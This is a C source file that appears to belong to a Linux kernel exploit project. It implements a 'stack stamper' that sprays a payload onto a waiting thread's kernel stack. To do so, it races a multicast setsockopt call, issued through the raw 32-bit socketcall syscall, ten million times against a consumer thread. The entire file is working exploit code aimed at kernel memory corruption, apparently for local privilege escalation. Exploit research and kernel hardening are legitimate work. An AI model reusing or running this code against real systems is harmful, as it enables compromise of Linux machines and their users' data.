/*
 * exp32 stack stamper — sprays the payload onto the waiter's kernel
 * stack via MCAST_JOIN_SOURCE_GROUP setsockopt racing the consumer.
 * 32-bit only (see main.c).
 */
#define _GNU_SOURCE

#include <errno.h>
#include <stdatomic.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <sys/syscall.h>

#include "kernelsnitch/utils.h"

extern atomic_int g_consumer_go;

void do_stamp_stack(uint64_t *buf) {
    int fd = socket(AF_INET, SOCK_DGRAM, 0);   // AF_INET not AF_INET6
    uint8_t buffer[260];
    if (fd < 0) {
        pr_warning("do_stamp_stack: socket failed errno=%d\n", errno);
        return;
    }
    pr_info("stamp: socketcall IPv4 off=0x20\n");
    memset(buffer, 0, sizeof(buffer));
    memcpy(buffer + 0x20, buf, 0x50);   // 0x20 not 0x70

    unsigned long args[5] = {
        (unsigned long)fd,
        IPPROTO_IP,             // 0, not IPPROTO_IPV6
        MCAST_JOIN_SOURCE_GROUP,
        (unsigned long)buffer,
        260
    };

    uint64_t times = 10000000;
    while (times--) {
        atomic_store(&g_consumer_go, 1);
        syscall(102, 14, args);
    }
    close(fd);
}
